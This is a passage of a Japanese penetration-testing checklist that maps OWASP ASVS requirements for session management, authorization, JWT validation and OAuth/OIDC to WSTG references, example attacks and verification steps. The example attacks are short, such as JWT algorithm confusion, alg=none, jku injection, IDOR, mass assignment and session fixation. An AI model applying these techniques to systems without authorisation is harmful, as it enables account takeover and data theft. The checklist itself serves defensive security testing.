| V6.8.3 | L2 | SAMLアサーションの一意利用（リプレイ防止） | 対応可 | 二重送信の拒否確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger WSA](https://portswigger.net/web-security/oauth)/[CWE-294](https://cwe.mitre.org/data/definitions/294.html) | 取得済みアサーション/コードの再送で再認証成功 | 一度使用済みトークン/コードの再送を行い受理不可であることを確認 |
| V6.8.4 | L2 | 期待する認証強度/方法/時刻を検証（acr/amr/auth_time等） | 対応可 | IdPクレーム検査とフォールバック確認 | [WSTG-SESS-10 / WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[OIDC Core](https://openid.net/specs/openid-connect-core-1_0.html#IDTokenClaims) | `acr`が要求値未満/`amr`不一致/古い`auth_time`でも高リスク操作が成功 | 受信トークンのクレームとアプリ側ポリシーの整合を確認（不足・不一致受理の検出） |

# V7 セッション管理

## V7.1 セッション管理ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V7.1.1 | L2 | 非アクティブ/絶対タイムアウトを文書化し再認証方針を明確化 | 範囲外 | 仕様・運用文書の提示依頼 | - | - | - |
| V7.1.2 | L2 | 同時セッション数と上限到達時の動作を文書化 | 範囲外 | 同時ログイン許容/追い出し有無の確認 | - | - | - |
| V7.1.3 | L2 | SSO/IdPを含むセッション有効期間・終了・再認証の連携を文書化 | 範囲外 | フェデレーション連携設計の確認 | - | - | - |

---

## V7.2 基本セッション管理セキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V7.2.1 | L1 | セッショントークン検証は信頼できるバックエンドで実施 | 対応可 | トークン改変/期限切れ時の応答確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[PortSwigger WSA](https://portswigger.net/web-security/jwt)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/JSON%20Web%20Token/)/[HackTricks](https://blog.1nf1n1ty.team/hacktricks/pentesting-web/hacking-jwt-json-web-tokens)/[CWE-347](https://cwe.mitre.org/data/definitions/347.html) | JWTの`alg=none`/RS256→HS256ダウングレード、`exp`改ざん | 署名無効化/期限超過JWTを送信し受理されたら検出 |
| V7.2.2 | L1 | 静的キーではなく動的な自己完結/リファレンストークンを使用 | 対応可 | APIキー固定の有無を確認 | [WSTG-SESS-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms)/[CWE-330](https://cwe.mitre.org/data/definitions/330.html) | 予測可能/長寿命の固定トークン（連番/時刻ベース）悪用 | トークンのランダム性/更新有無を確認し推測・再利用が成立すれば検出 |
| V7.2.3 | L1 | 参照トークンはCSPRNGで≥128bitエントロピー | 対応可 | 推測/列挙耐性の簡易評価 | [WSTG-SESS-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms)/[CWE-331](https://cwe.mitre.org/data/definitions/331.html) | 短いセッションIDを部分ブルートフォースで一致させる | サンプル収集→エントロピー推定→部分総当たりで衝突/推測成立を確認 |
| V7.2.4 | L1 | 認証/再認証時にトークン再発行＋旧トークン失効 | 対応可 | ログイン直後のトークンローテ確認 | [WSTG-SESS-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation)/[PortSwigger WSA](https://portswigger.net/web-security/dom-based/cookie-manipulation)/[CWE-384](https://cwe.mitre.org/data/definitions/384.html) | ログイン前付与のセッションIDがログイン後も有効（固定化） | 事前にID固定→ログイン→旧IDで認可済み操作が可能なら検出 |

---

## V7.3 セッションタイムアウト

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V7.3.1 | L2 | 非アクティブタイムアウトで再認証を強制 | 対応可 | 放置後操作での再ログイン要求確認 | [WSTG-SESS-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | 長時間放置後に認可操作が継続可能 | 既定無操作時間超過後に保護資源へアクセスし再認証要求が無ければ検出 |
| V7.3.2 | L2 | 絶対最大存続期間で再認証を強制 | 対応可 | 長時間連続利用時の期限切れ確認 | [WSTG-SESS-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | 絶対有効期限超過後もセッション継続 | 長時間の継続アクセス/再開で失効せず操作可能なら検出 |


---

## V7.4 セッションの終了

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V7.4.1 | L1 | 終了後のセッション再利用を禁止（参照/自己完結型に応じた失効方式） | 対応可 | ログアウト後のAPI/画面アクセスが無効か確認 | [WSTG-SESS-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | ログアウト後に旧Cookieを再設定して再利用 | Cookie退避→ログアウト→旧Cookie復元で保護資源にアクセスできれば検出 |
| V7.4.2 | L1 | アカウント無効/削除時は全アクティブセッションを終了 | 対応可 | 権限剝奪後の継続利用可否検証 | [WSTG-SESS-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | 管理側でアカウント無効化後も別端末のセッションが生存 | 他端末でログイン維持→管理側で無効化→操作継続可なら検出 |
| V7.4.3 | L2 | 認証要素更新後に他端末含む全セッション終了のオプション提供 | 対応可 | PW/MFA変更直後の他端末強制ログアウト確認 | [WSTG-SESS-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | パスワード変更後も他端末で操作継続可能 | 資格情報更新→他端末のセッション継続を確認し終了できなければ検出 |
| V7.4.4 | L2 | すべての保護ページで明確なログアウト導線 | 対応可 | 目立つ位置/1クリック到達確認 | [WSTG-SESS-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | ログアウト導線が見当たらず放置セッションが残存 | 全ページでのログアウトUI有無/反応を確認し不備あれば検出 |
| V7.4.5 | L2 | 管理者が個別/全体のセッション終了を実行可能 | 対応可 | 管理UI/APIの存在・監査ログ確認 | [WSTG-SESS-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | 侵害端末のセッションを管理側で強制終了できない | 管理UIから特定/全セッション終了操作が行えない/反映されないなら検出 |

---

## V7.5 セッションの悪用に対する防御

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V7.5.1 | L2 | 機密アカウント属性変更前に完全再認証 | 対応可 | メアド/電話/MFA/復旧情報変更時の再認証確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/other-mechanisms)/[CWE-306](https://cwe.mitre.org/data/definitions/306.html) | 再認証なしでメール/電話/MFA設定を変更 | 高リスク設定変更時に追加認証/MFA要求が無ければ検出 |
| V7.5.2 | L2 | ユーザがアクティブセッション一覧と選択終了を実施可能 | 対応可 | セッション管理画面の有無/終了動作確認 | [WSTG-SESS-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | 乗っ取られた端末のセッションをユーザが失効できない | 端末/場所ごとのセッション一覧とリモート終了可否を確認し不可なら検出 |
| V7.5.3 | L3 | 高リスク操作前に追加認証/二次検証を要求 | 対応可 | 送金/権限変更時のステップアップ確認 | [WSTG-ATHN-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/multi-factor)/[CWE-306](https://cwe.mitre.org/data/definitions/306.html) | 高額送金や権限昇格が追加認証なしで実行可能 | 高リスク機能呼出時に追加要素が要求されない場合を検出 |

---

## V7.6 フェデレーション再認証

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V7.6.1 | L2 | RP-IdP間の有効期間/終了が文書通り動作し必要時に再認証要求 | 範囲外 | IdP設定/契約の確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger WSA](https://portswigger.net/web-security/oauth)/[OpenID Connect RP-Initiated Logout](https://openid.net/specs/openid-connect-rpinitiated-1_0.html) | IdPでログアウトしてもRPセッションが存続（SSO単方向終了） | IdP/RP双方でログアウト実施後の再認証要求の有無を確認し乖離があれば検出 |
| V7.6.2 | L2 | ユーザの同意/明示操作なしに新規アプリセッションを作成しない | 対応可 | サイレントSSO成立条件の確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger WSA](https://portswigger.net/web-security/oauth)/[OpenID Connect Core: prompt](https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest) | OAuth同意画面を経ずに自動でアプリセッション作成 | 初回アクセス時に同意/UI操作なしでログイン成立なら検出 |

# V8 認可

## V8.1 認可ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V8.1.1 | L1 | 機能/データ基盤のアクセス制御ルールを文書化 | 範囲外 | 仕様・権限定義の提示依頼 | - | - | - |
| V8.1.2 | L2 | フィールドレベル（読/書）制御を文書化 | 範囲外 | 更新/参照APIの項目別ルール確認 | - | - | - |
| V8.1.3 | L3 | 環境/コンテキスト属性（時刻/位置/IP/端末等）の定義 | 範囲外 | 収集・評価ポリシーの有無確認 | - | - | - |
| V8.1.4 | L3 | 環境/コンテキストを用いた意思決定（許可/チャレンジ/拒否/ステップアップ）を文書化 | 範囲外 | リスク閾値と動作の確認 | - | - | - |

---

## V8.2 一般的な認可設計

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V8.2.1 | L1 | 機能レベルは明示パーミッション必須 | 対応可 | UI/API機能の直接呼出しで拒否確認 | [WSTG-ATHZ-02](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema)/[PortSwigger: Access control](https://portswigger.net/web-security/access-control)/[PortSwigger Lab: Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)/[CWE-862](https://cwe.mitre.org/data/definitions/862.html) | 非管理ユーザが `/admin/users` を直接呼び出し、ユーザ作成/削除を試行 | 権限別アカウントで機能直叩きし、UI非経由でも200系で成功するなら権限制御不備として検出 |
| V8.2.2 | L1 | データ固有アクセスは明示パーミッション（IDOR/BOLA対策） | 対応可 | 他者ID/他テナントIDでの取得/更新試験 | [WSTG-ATHZ-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)/[PortSwigger: IDOR](https://portswigger.net/web-security/access-control/idor)/[PortSwigger Lab: User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter)/[PayloadsAllTheThings: IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)/[CWE-639](https://cwe.mitre.org/data/definitions/639.html) | `/api/orders/124` に他人の注文IDを指定して参照/更新が可能か確認 | 自アカウント以外のIDへ置換してレスポンス/更新成功ならIDOR/BOLAとして検出 |
| V8.2.3 | L2 | フィールド単位の許可（BOPLA対策） | 対応可 | 非許可フィールドの更新/漏えい有無 | [WSTG-INPV-20](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)/[owasp: Mass assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)/[HackTricks: Mass Assignment](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/web-api-pentesting)/[CWE-915](https://cwe.mitre.org/data/definitions/915.html) | `role` や `isAdmin` 等の隠し/本来不可のプロパティをリクエストに追加して権限昇格 | 非公開フィールド追加/変更が反映される（レス/DBに反映）ならMass Assignment/BOPLAとして検出 |
| V8.2.4 | L3 | コンテキストに応じた適応型制御を実装（セッション中も） | 対応可 | 端末/位置変化でのステップアップ誘発確認 | [WSTG-BUSL-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows)/[PortSwigger: Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)/[CWE-841](https://cwe.mitre.org/data/definitions/841.html) | 本人確認ステップ（追加認証）をフロー抜けで回避して決済/権限変更を完了 | 正規フローの手順をスキップ/順序入替で高価値操作が成立すればワークフロー回避として検出 |

---

## V8.3 操作レベルの認可

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V8.3.1 | L1 | 認可は信頼できるサーバ層で適用（クライアント依存しない） | 対応可 | JS保護無効化時でも拒否継続を確認 | [WSTG-ATHZ-02](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema)/[PortSwigger: Access control](https://portswigger.net/web-security/access-control)/[CWE-602](https://cwe.mitre.org/data/definitions/602.html) | DevToolsでフロントの権限チェック無効化後に直接APIを叩き機能実行 | フロント無効化/改変でもサーバが許容（200系）するなら認可がCS依存として検出 |
| V8.3.2 | L3 | ルール変更は即時反映。不可なら検知/ロールバック等の緩和 | 対応可 | 役割変更後の権限即時性を確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | ロール降格後も旧JWTの`role=admin`で管理APIが有効（トークン失効/検証不備） | 役割変更後に旧トークンで高権限が継続利用できれば即時反映不備として検出 |
| V8.3.3 | L3 | 代理ではなく発信主体の権限で判定（委譲は明示） | 対応可 | サービス間呼出しで末端がユーザ権限評価か確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger: OAuth vulnerabilities](https://portswigger.net/web-security/oauth)/[RFC 6749 \u00a74.4](https://www.rfc-editor.org/rfc/rfc6749#section-4.4) | 機械間トークン（client_credentials）で本来ユーザ権限が必要なAPIを実行 | トークン種/スコープ不整合でユーザ資源操作が成功するなら委譲不備として検出 |

---

## V8.4 他の認可の考慮

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V8.4.1 | L2 | マルチテナントのクロステナント隔離 | 対応可 | テナントID切替/汚染試験 | [WSTG-APIT-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization)/[PortSwigger: IDOR](https://portswigger.net/web-security/access-control/idor)/[PayloadsAllTheThings: IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)/[CWE-639](https://cwe.mitre.org/data/definitions/639.html) | `X-Tenant-ID`/URLパスのテナント識別子を他社値へ置換してデータ取得 | テナント識別子改変で他社データ取得/操作が可能ならBOLA（クロステナント）として検出 |
| V8.4.2 | L3 | 管理UIは多層防御（継続的ID検証/端末態勢/リスク分析）で保護 | 対応可 | ネットワークのみ依存でないか確認 | [WSTG-ATHZ-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation)/[PortSwigger: Privilege escalation](https://portswigger.net/web-security/access-control)/[PortSwigger Lab: User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)/[CWE-269](https://cwe.mitre.org/data/definitions/269.html) | 一般ユーザがURL直打ち/機能連鎖で管理画面機能へ昇格 | ロール不一致のまま管理操作が成立すれば権限昇格として検出 |

# V9 自己完結型トークン

## V9.1 トークンのソースと完全性

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V9.1.1 | L1 | 署名/MACで改竄検出し検証後にのみ受容 | 対応可 | JWS/JWT/SAMLの署名検証必須・署名無し拒否 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[PortSwigger WSA](https://portswigger.net/web-security/jwt)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/JSON%20Web%20Token/)/[HackTricks](https://blog.1nf1n1ty.team/hacktricks/pentesting-web/hacking-jwt-json-web-tokens)/[CWE-347](https://cwe.mitre.org/data/definitions/347.html) | JWTの`"role":"admin"`を書き換え、署名を破壊したトークンを送信 | 署名不一致/無効署名のトークンでAPIが200を返す・権限が反映されれば検出 |
| V9.1.2 | L1 | アルゴリズム許可リスト運用（`none`禁止/対称・非対称の混在管理） | 対応可 | `alg`固定/ピン留め確認、意図外アルゴ拒否 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[PortSwigger: Algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)/[PortSwigger: 'alg=none'](https://portswigger.net/web-security/jwt/)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/JSON%20Web%20Token/)/[CWE-347](https://cwe.mitre.org/data/definitions/347.html) | `RS256`想定の実装に対し`HS256`で署名（公開鍵をHMAC鍵に流用）し通過を狙う | `alg`を変更したトークンを送信し受理されればアルゴ混同/許可リスト不備として検出 |
| V9.1.3 | L1 | 検証鍵は事前登録の信頼ソースのみ（`jku/x5u/jwk`は許可リスト検証） | 対応可 | 動的鍵取得の禁止/許可ドメイン検証 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[PortSwigger: jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)/[RFC 7515 §4.1.2 (jku)](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2)/[HackTricks](https://blog.1nf1n1ty.team/hacktricks/pentesting-web/hacking-jwt-json-web-tokens)/[CWE-829](https://cwe.mitre.org/data/definitions/829.html) | ヘッダ`jku`/`x5u`を攻撃者管理のJWKS/証明書URLに差し替え、攻撃者鍵で署名 | 許可外の`jku/x5u/jwk`を指すトークンが受理されれば鍵注入として検出 |

---

## V9.2 トークンコンテンツ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V9.2.1 | L1 | 有効期間検証（`nbf`/`exp` 等） | 対応可 | 期限外拒否・クロックスキュー許容範囲確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[RFC 7519 §4.1.4 (exp)](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.4)/[RFC 7519 §4.1.5 (nbf)](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.5)/[PortSwigger WSA](https://portswigger.net/web-security/jwt) | `exp`を過去/`nbf`を未来に設定したトークンでアクセス | 失効済み/未有効トークンで保護資源にアクセス可能なら期限検証不備として検出 |
| V9.2.2 | L2 | 用途適合性（IDトークン/アクセストークンの取り違え防止） | 対応可 | エンドポイント毎の受容トークン種を検証 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[OpenID Connect Core §ID Token](https://openid.net/specs/openid-connect-core-1_0.html#IDToken)/[RFC 6750 (Bearer)](https://www.rfc-editor.org/rfc/rfc6750)/[PortSwigger WSA (OAuth)](https://portswigger.net/web-security/oauth) | OIDCの`id_token`を`Authorization: Bearer`としてAPIに提示し通過 | リソースサーバが`id_token`や不適切なトークン種を受理すれば用途取り違えとして検出 |
| V9.2.3 | L2 | オーディエンス制限（`aud` を許可リスト照合） | 対応可 | 受信サービス識別子の厳格一致確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[RFC 7519 §4.1.3 (aud)](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.3)/[PortSwigger WSA](https://portswigger.net/web-security/jwt)/[IANA JWT Claims](https://www.iana.org/assignments/jwt) | サービスA向けトークン（`aud":"svc-a"`）でサービスBのAPIへアクセス | `aud`不一致トークンが受理されればオーディエンス検証不備として検出 |
| V9.2.4 | L2 | 複数オーディエンス発行時は一意な`aud`付与と検証 | 対応可 | 発行者側設計の確認/`aud`なりすまし検査 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[RFC 7519 §4.1.3 (aud)](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.3)/[OpenID Connect Core §ID Token Validation](https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation)/[RFC 9068 (OAuth JWT Access Tokens)](https://www.rfc-editor.org/rfc/rfc9068) | `aud:["mobile-app","api"]`のトークンを本来対象外の`api`や第三者サービスで受理 | 期待`aud`と厳格一致しない複数値/曖昧一致の受理を確認できれば検出 |

# V10 OAuth と OIDC

## V10.1 一般的な OAuth と OIDC セキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V10.1.1 | L2 | トークンは必要コンポーネントのみに送達（BFFではバックエンド限定） | 対応可 | ブラウザ/ネットワークでアクセストークン露出有無を確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger OAuth](https://portswigger.net/web-security/oauth)/[PayloadsAllTheThings OAuth 2](https://swisskyrepo.github.io/PayloadsAllTheThings/OAuth%20Misconfiguration/)/[HackTricks OAuth/OIDC](https://angelica.gitbook.io/hacktricks/pentesting-web/oauth-to-account-takeover) | フロントJSで`access_token`を`localStorage`に保存しXSS/拡張で盗難 | DevTools/プロキシでトークンがフロントへ配布/保存・送信されていないか確認（露出があれば検出） |
| V10.1.2 | L2 | 認可応答のセッション/トランザクション紐付け（PKCE/state/nonce） | 対応可 | CSRF/混入対策の有効性検証 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger OAuth grant types](https://portswigger.net/web-security/oauth/grant-types)/[PortSwigger Forced OAuth profile linking](https://portswigger.net/web-security/oauth)/[RFC 7636 PKCE](https://www.rfc-editor.org/rfc/rfc7636) | `state`未検証や`nonce`未検証により別セッションの`code`/`id_token`を混入 | `state`/`nonce`/`code_verifier`の有無と整合性を改竄試験し、不一致でも受理されれば検出 |

---

## V10.2 OAuth クライアント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V10.2.1 | L2 | コードフローでPKCEまたはstate検証によりCSRF防止 | 対応可 | `code_verifier`/`state`の整合性テスト | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger OAuth grant types](https://portswigger.net/web-security/oauth/grant-types)/[PortSwigger Forced OAuth profile linking](https://portswigger.net/web-security/oauth)/[RFC 7636 PKCE](https://www.rfc-editor.org/rfc/rfc7636) | 攻撃者が被害者ブラウザに自分の`code`を注入してトークン化（認可コード注入） | `state`不一致や`code_verifier`不整合のリクエストが通るか検証し、通れば検出 |
| V10.2.2 | L2 | 複数AS時のミックスアップ攻撃防御（`iss`検証等） | 対応可 | 認可/トークン応答の発行者一致確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger OAuth mix-up attack](https://portswigger.net/web-security/oauth)/[RFC 9207 AS Issuer Identification](https://www.rfc-editor.org/rfc/rfc9207)/[OpenID Provider Issuer Identifier docs](https://openid.net/specs/openid-connect-discovery-1_0.html#IssuerDiscovery) | AS-A向けリクエストにAS-Bの応答を混入させてトークンを誤発行/受理 | `iss`/`token_endpoint`由来の発行者検証欠如をテストし、異AS応答でも受理なら検出 |
| V10.2.3 | L3 | 最小権限のスコープ要求 | 対応可 | リクエスト/発行スコープの差分確認 | [WSTG-ATHZ-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)/[PortSwigger Preventing OAuth vulnerabilities](https://portswigger.net/web-security/oauth/preventing)/[RFC 6749 \u00a73.3 Scopes](https://www.rfc-editor.org/rfc/rfc6749#section-3.3) | クライアントが不要な`admin`/`write:*`等の広範スコープを要求し許可 | 要求/発行/使用スコープを比較し最小化されていない・拒否されない場合は検出 |

---

## V10.3 OAuth リソースサーバ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V10.3.1 | L2 | 自サービス向けトークンのみ受理（`aud`/RIで検証） | 対応可 | `aud`厳格一致/イントロスペクション確認 | [WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)/[PortSwigger JWT vulnerabilities](https://portswigger.net/web-security/jwt)/[RFC 8707 Resource Indicators](https://www.rfc-editor.org/rfc/rfc8707) | サービスA向け`aud`で署名正当なATをサービスBに提示し通過 | `aud`不一致トークンが受理されれば検出（JWT検証/RIの厳格性不備） |
